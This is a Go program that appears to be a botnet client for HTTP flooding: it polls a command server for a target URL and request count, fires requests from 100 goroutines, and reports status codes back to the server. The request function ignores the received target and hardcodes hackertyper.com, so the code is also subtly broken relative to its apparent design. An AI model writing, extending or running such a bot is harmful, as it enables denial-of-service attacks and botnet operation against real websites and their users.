package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"sync"
	"time"
)

type ResultsObject struct {
	Target      string `json:"target"`
	StatusCodes []int  `json:"status"`
}

type TargetInfo struct {
	Status     bool
	TargetUrl  string
	RequestNum int
}

func main() {
	const serverURL = "http://localhost:5000"
	// for {
	StartBot(serverURL)
	// }
}

func SendRequests(target string, requestsNum int, goroutinesNum int) *ResultsObject {
	var statusCodes []int
	var wg sync.WaitGroup

	ch := make(chan http.Response)

	wg.Add(goroutinesNum)
	for i := 0; i < goroutinesNum; i++ {
		go SendRequestGoroutine("https://hackertyper.com/", requestsNum/goroutinesNum, ch, &wg)
	}

	go func() {
		wg.Wait()
		close(ch)
	}()

	for response := range ch {
		statusCodes = append(statusCodes, response.StatusCode)
		fmt.Println(response.StatusCode)
		response.Body.Close()
	}

	fmt.Println(len(statusCodes))

	return &ResultsObject{
		Target:      target,
		StatusCodes: statusCodes,
	}
}

func SendRequestGoroutine(target string, times int, ch chan http.Response, wg *sync.WaitGroup) {
	defer wg.Done()

	for i := 0; i < times; i++ {
		response, err := http.Get(target)
		if err != nil {
			fmt.Println("Target GET request error.")
			panic(err)
		}
		ch <- *response
	}
}

func GetTargetInfo(serverUrl string) *TargetInfo {
	const getTargetInfoEndpoint = "/getTargetInfo"
	response, err := http.Get(serverUrl + getTargetInfoEndpoint)
	if err != nil {
		log.Fatal(err)
		return &TargetInfo{
			Status:     false,
			TargetUrl:  "",
			RequestNum: 0,
		}
	}
	target, _ := ioutil.ReadAll(response.Body)
	response.Body.Close()

	var targetInfo TargetInfo
	json.Unmarshal(target, &targetInfo)

	return &targetInfo
}

func SendBotStats(serverUrl string, statsObject ResultsObject) {

	const sendBotStats = "/sendBotStat"

	stats, _ := json.Marshal(statsObject)
	_, err := http.Post(serverUrl+sendBotStats, "application/json",
		bytes.NewBuffer(stats))
	if err != nil {
		fmt.Println("Stats sending failed.")
		log.Fatal(err)
	}

}

func StartBot(serverUrl string) {
	goRoutinesNum := 100

	targetObject := GetTargetInfo(serverUrl)

	if targetObject.Status && (targetObject.TargetUrl != "") {
		var RequestInfo *ResultsObject = SendRequests(targetObject.TargetUrl,
			targetObject.RequestNum, goRoutinesNum)
		SendBotStats(serverUrl, *RequestInfo)
	}

	if !targetObject.Status {
		fmt.Println("Server status is set to false.")
		time.Sleep(10 * time.Second)
	}

	if targetObject.TargetUrl == "" {
		fmt.Println("No target link specified.")
		time.Sleep(10 * time.Second)
	}

}
